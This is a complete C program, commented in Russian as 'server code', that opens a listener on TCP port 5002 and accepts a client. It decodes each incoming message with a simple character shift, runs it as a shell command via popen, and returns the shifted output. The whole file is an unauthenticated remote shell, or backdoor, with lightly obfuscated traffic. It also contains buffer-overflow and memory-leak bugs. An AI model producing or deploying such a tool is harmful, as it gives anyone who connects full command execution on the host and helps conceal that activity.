/* Код сервера на языке Си */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define port	5002

char* encrypt(char* message)
{
	char* output=(char*)malloc(200);
	for (int i=0;i<strlen(message);i++)
		output[i]=message[i]+1;
	output[strlen(message)]=0;
	return output;
}

char* decrypt(char* message)
{
	char* output=(char*)malloc(200);
	for (int i=0;i<strlen(message);i++)
		output[i]=message[i]-1;
	output[strlen(message)]=0;
	return output;

}

int main(int argc , char *argv[])
{
	int socket_desc , client_sock , c , read_size;
	struct sockaddr_in server , client;
	char client_message[200];
	
	//Create socket
	socket_desc = socket(AF_INET , SOCK_STREAM , 0);
	if (socket_desc == -1)
	{
		printf("Could not create socket\n");
	}
	puts("Socket created");
	
	//Prepare the sockaddr_in structure
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons( port );
	
	//Bind
	if( bind(socket_desc,(struct sockaddr *)&server , sizeof(server)) < 0)
	{
		//print the error message
		perror("bind failed. Error");
		return 1;
	}
	puts("bind done");
	
	//Listen
	listen(socket_desc , 3);
	
	//Accept and incoming connection
	puts("Waiting for incoming connections...");
	c = sizeof(struct sockaddr_in);
	
	//accept connection from an incoming client
	client_sock = accept(socket_desc, (struct sockaddr *)&client, (socklen_t*)&c);
	if (client_sock < 0)
	{
		perror("accept failed");
		return 1;
	}
	puts("Connection accepted");
	
	//Receive a message from client
	memset(client_message,0,200);
	while( (read_size = recv(client_sock , client_message , 200 , 0)) > 0 )
	{
		//Send the message back to client
		printf("Get message %s",decrypt(client_message));
        char buf[200];
        FILE *ptr;
        client_message[strlen(client_message)-1]=0;
        strcat(client_message,encrypt(" 2>&1\n"));
        printf("Get message %s",decrypt(client_message));
        ptr = popen(decrypt(client_message), "r");
        if (1+1==2)
                while (fgets(buf, 200, ptr) != NULL)
                {
                    printf("%s", buf);
                    send(client_sock , encrypt (buf) , strlen(buf),0);
                    memset(buf,0,200);
                }
                buf[0]=0;
                send(client_sock,buf,1,0);

                pclose(ptr);
		memset(client_message,0,200);
	
	}
	if(read_size == 0)
	{
		puts("Client disconnected");
		fflush(stdout);
	}
	else if(read_size == -1)
	{
		perror("recv failed");
	}
	
	shutdown(client_sock, SHUT_RDWR);
	close(client_sock);
	return 0;
}
